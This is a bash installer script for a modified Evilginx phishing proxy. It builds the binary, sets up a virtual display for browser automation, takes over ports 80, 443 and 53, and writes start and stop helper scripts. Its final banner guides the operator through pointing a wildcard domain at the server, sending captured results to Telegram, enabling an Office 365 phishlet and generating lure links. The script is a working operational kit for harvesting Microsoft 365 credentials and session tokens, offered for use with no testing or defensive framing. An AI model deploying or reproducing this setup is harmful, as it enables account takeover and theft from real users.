#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Evilginx CL Edition — One-Command VPS Installer
# ═══════════════════════════════════════════════════════════════
#
# One-liner (from a fresh Ubuntu/Debian VPS):
#
#   apt update && apt install -y git && git clone https://github.com/saroula01/master /opt/evilginx && cd /opt/evilginx && chmod +x install.sh && ./install.sh
#
# Or if already cloned:
#   chmod +x install.sh && sudo ./install.sh
#
# After install, you only need to configure:
#   1. config domain <your_domain>
#   2. config telegram <bot_token> <chat_id>
#
# ═══════════════════════════════════════════════════════════════

set -e

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
MAGENTA='\033[1;35m'
NC='\033[0m'

GO_VERSION="1.24.4"
GO_TARBALL="go${GO_VERSION}.linux-amd64.tar.gz"
GO_URL="https://go.dev/dl/${GO_TARBALL}"
PROJECT_DIR="$(pwd)"

header() {
    echo ""
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║         Evilginx CL Edition — VPS Auto-Installer         ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

step() {
    echo ""
    echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}  [$1/$2]${NC} ${WHITE}$3${NC}"
    echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

ok() {
    echo -e "  ${GREEN}✓${NC} $1"
}

warn() {
    echo -e "  ${YELLOW}⚠${NC} $1"
}

fail() {
    echo -e "  ${RED}✗${NC} $1"
    exit 1
}

# ─── Check root ───────────────────────────────────────────────
if [ "$(id -u)" -ne 0 ]; then
    fail "This script must be run as root (use sudo)"
fi

header

# ─── Check we're in the project root ─────────────────────────
if [ ! -f "main.go" ]; then
    fail "main.go not found — run this script from the project root directory"
fi

TOTAL_STEPS=8

# ─── Step 1: System dependencies ─────────────────────────────
step 1 $TOTAL_STEPS "Installing system dependencies"

export DEBIAN_FRONTEND=noninteractive

apt-get update -qq > /dev/null 2>&1
apt-get upgrade -y -qq > /dev/null 2>&1
apt-get install -y -qq \
    tar wget curl git make \
    tmux screen \
    chromium-browser chromium-chromedriver xvfb \
    dnsutils net-tools jq \
    > /dev/null 2>&1 || {
    # Fallback for distros that use 'chromium' package name
    apt-get install -y -qq chromium xvfb > /dev/null 2>&1 || true
}

# Find Chromium path
CHROMIUM_PATH=""
for path in /usr/bin/chromium-browser /usr/bin/chromium /snap/bin/chromium; do
    if [ -f "$path" ]; then
        CHROMIUM_PATH="$path"
        break
    fi
done
command -v chromium-browser &>/dev/null && CHROMIUM_PATH=$(which chromium-browser)
command -v chromium &>/dev/null && CHROMIUM_PATH=$(which chromium)

if [ -z "$CHROMIUM_PATH" ]; then
    warn "Chromium not found — install manually: apt install chromium-browser"
else
    ok "Chromium: $CHROMIUM_PATH"
fi

ok "System dependencies installed"

# ─── Step 2: Install Go ──────────────────────────────────────
step 2 $TOTAL_STEPS "Installing Go ${GO_VERSION}"

NEED_GO=true
if command -v go &>/dev/null; then
    CURRENT_GO=$(go version 2>/dev/null | grep -oP 'go\K[0-9.]+' || echo "")
    if [ "$CURRENT_GO" = "$GO_VERSION" ]; then
        ok "Go ${GO_VERSION} already installed"
        NEED_GO=false
    else
        warn "Found Go ${CURRENT_GO}, upgrading..."
        rm -rf /usr/local/go
    fi
fi

if [ "$NEED_GO" = true ]; then
    wget -q "$GO_URL" -O "/tmp/${GO_TARBALL}"
    tar -xzf "/tmp/${GO_TARBALL}" -C /usr/local/
    rm -f "/tmp/${GO_TARBALL}"
    ok "Go ${GO_VERSION} installed"
fi

echo "export PATH=/usr/local/go/bin:\${PATH}" > /etc/profile.d/go.sh
chmod +x /etc/profile.d/go.sh
export PATH=/usr/local/go/bin:${PATH}

# ─── Step 3: Build ───────────────────────────────────────────
step 3 $TOTAL_STEPS "Building evilginx binary"

if [ -f "build_secure.sh" ]; then
    chmod +x build_secure.sh
    bash build_secure.sh
    ok "Secure build complete (VPS-locked + password protected)"
else
    mkdir -p build
    /usr/local/go/bin/go build -o ./build/evilginx -mod=vendor main.go
    ok "Build complete"
fi

if [ ! -f "./build/evilginx" ]; then
    fail "Build failed — binary not found"
fi

ok "Binary: ./build/evilginx ($(du -h ./build/evilginx | cut -f1))"

# ─── Step 4: Xvfb virtual display ────────────────────────────
step 4 $TOTAL_STEPS "Setting up virtual display for EvilPuppet"

pkill -f "Xvfb :99" 2>/dev/null || true
sleep 1

cat > /etc/systemd/system/xvfb.service << 'EOF'
[Unit]
Description=X Virtual Framebuffer for EvilPuppet
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/Xvfb :99 -screen 0 1920x1080x24
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable xvfb.service > /dev/null 2>&1
systemctl start xvfb.service 2>/dev/null || true
export DISPLAY=:99

ok "Xvfb virtual display :99 active"

# ─── Step 5: Network ports ───────────────────────────────────
step 5 $TOTAL_STEPS "Freeing network ports (80, 443, 53)"

systemctl stop systemd-resolved 2>/dev/null || true
systemctl disable systemd-resolved 2>/dev/null || true

if [ -L /etc/resolv.conf ]; then
    rm -f /etc/resolv.conf
    echo -e "nameserver 8.8.8.8\nnameserver 1.1.1.1" > /etc/resolv.conf
fi

systemctl stop apache2 2>/dev/null || true
systemctl stop nginx 2>/dev/null || true
systemctl disable apache2 2>/dev/null || true
systemctl disable nginx 2>/dev/null || true

ok "Ports 80, 443, 53 freed"

# ─── Step 6: Auto-detect server IP ───────────────────────────
step 6 $TOTAL_STEPS "Detecting server configuration"

SERVER_IP=$(curl -4 -s --connect-timeout 5 https://api.ipify.org 2>/dev/null || \
            curl -4 -s --connect-timeout 5 https://ifconfig.me 2>/dev/null || \
            curl -4 -s --connect-timeout 5 https://icanhazip.com 2>/dev/null || \
            echo "")

if [ -n "$SERVER_IP" ]; then
    ok "External IP detected: $SERVER_IP"
else
    warn "Could not auto-detect IP — set manually: config ipv4 external <IP>"
fi

# ─── Step 7: Helper scripts ──────────────────────────────────
step 7 $TOTAL_STEPS "Creating helper scripts"

# Start script
cat > "${PROJECT_DIR}/start.sh" << 'STARTEOF'
#!/bin/bash
export DISPLAY=:99
export PATH=/usr/local/go/bin:${PATH}

# Ensure Xvfb
if ! pgrep -x Xvfb > /dev/null; then
    Xvfb :99 -screen 0 1920x1080x24 &>/dev/null &
    sleep 1
fi

systemctl stop systemd-resolved 2>/dev/null || true

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

if tmux has-session -t evilginx 2>/dev/null; then
    echo -e "\033[1;33mevilginx is already running\033[0m"
    echo "  Attach: tmux attach -t evilginx"
    exit 0
fi

tmux new-session -d -s evilginx "sudo DISPLAY=:99 ./build/evilginx -p ./phishlets -t ./redirectors"
echo ""
echo -e "\033[1;32m  ✓ evilginx started\033[0m"
echo ""
echo "  Attach:  tmux attach -t evilginx"
echo "  Detach:  Ctrl+B then D"
echo "  Stop:    ./stop.sh"
echo ""
STARTEOF
chmod +x "${PROJECT_DIR}/start.sh"

# Stop script
cat > "${PROJECT_DIR}/stop.sh" << 'STOPEOF'
#!/bin/bash
tmux kill-session -t evilginx 2>/dev/null && echo "evilginx stopped" || echo "evilginx not running"
STOPEOF
chmod +x "${PROJECT_DIR}/stop.sh"

# Rebuild script
cat > "${PROJECT_DIR}/rebuild.sh" << 'REBUILDEOF'
#!/bin/bash
export PATH=/usr/local/go/bin:${PATH}
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

if [ -f "build_secure.sh" ]; then
    sudo bash build_secure.sh
else
    /usr/local/go/bin/go build -o ./build/evilginx -mod=vendor main.go
fi

echo -e "\033[1;32m  ✓ Rebuild complete\033[0m"
echo "  Restart: ./stop.sh && sudo ./start.sh"
REBUILDEOF
chmod +x "${PROJECT_DIR}/rebuild.sh"

ok "Helper scripts: start.sh, stop.sh, rebuild.sh"

# ─── Step 8: Summary ─────────────────────────────────────────
step 8 $TOTAL_STEPS "Setup complete"

echo ""
echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}              Installation Successful!                    ${NC}"
echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "  ${WHITE}After evilginx launches, configure in 3 easy steps:${NC}"
echo ""
echo -e "${CYAN}  ┌───────────────────────────────────────────────────────┐${NC}"
echo -e "${CYAN}  │${NC}                                                       ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}  ${WHITE}1. Set your domain + IP:${NC}                              ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}     ${GREEN}config domain${NC} ${YELLOW}example.com${NC}                          ${CYAN}│${NC}"
if [ -n "$SERVER_IP" ]; then
echo -e "${CYAN}  │${NC}     ${GREEN}config ipv4 external${NC} ${YELLOW}${SERVER_IP}${NC}$(printf '%*s' $((23 - ${#SERVER_IP})) '')${CYAN}│${NC}"
else
echo -e "${CYAN}  │${NC}     ${GREEN}config ipv4 external${NC} ${YELLOW}<server-ip>${NC}                    ${CYAN}│${NC}"
fi
echo -e "${CYAN}  │${NC}     ${GREEN}config wildcard_tls on${NC}                                ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}                                                       ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}  ${WHITE}2. Set Telegram notifications:${NC}                        ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}     ${GREEN}config telegram${NC} ${YELLOW}<bot_token> <chat_id>${NC}                ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}                                                       ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}  ${WHITE}3. Enable phishlet & get link:${NC}                        ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}     ${GREEN}phishlets hostname o365 login.${NC}${YELLOW}<domain>${NC}               ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}     ${GREEN}phishlets enable o365${NC}                                 ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}     ${GREEN}lures create o365${NC}                                     ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}     ${GREEN}lures get-url 0${NC}                                       ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}                                                       ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}  ${WHITE}DNS: Create A records at your registrar:${NC}              ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}     A  @  →  ${YELLOW}<server-ip>${NC}                                ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}     A  *  →  ${YELLOW}<server-ip>${NC}                                ${CYAN}│${NC}"
echo -e "${CYAN}  │${NC}                                                       ${CYAN}│${NC}"
echo -e "${CYAN}  └───────────────────────────────────────────────────────┘${NC}"
echo ""
echo -e "  ${WHITE}Commands:${NC}"
echo -e "    ${GREEN}sudo ./start.sh${NC}         Start evilginx in tmux"
echo -e "    ${GREEN}tmux attach -t evilginx${NC} Attach to running session"
echo -e "    ${GREEN}./stop.sh${NC}               Stop evilginx"
echo -e "    ${GREEN}./rebuild.sh${NC}            Rebuild after code changes"
echo ""
echo -e "  ${CYAN}Launching evilginx...${NC}"
echo ""

cd "${PROJECT_DIR}"
export DISPLAY=:99
sudo DISPLAY=:99 ./build/evilginx -p ./phishlets -t ./redirectors
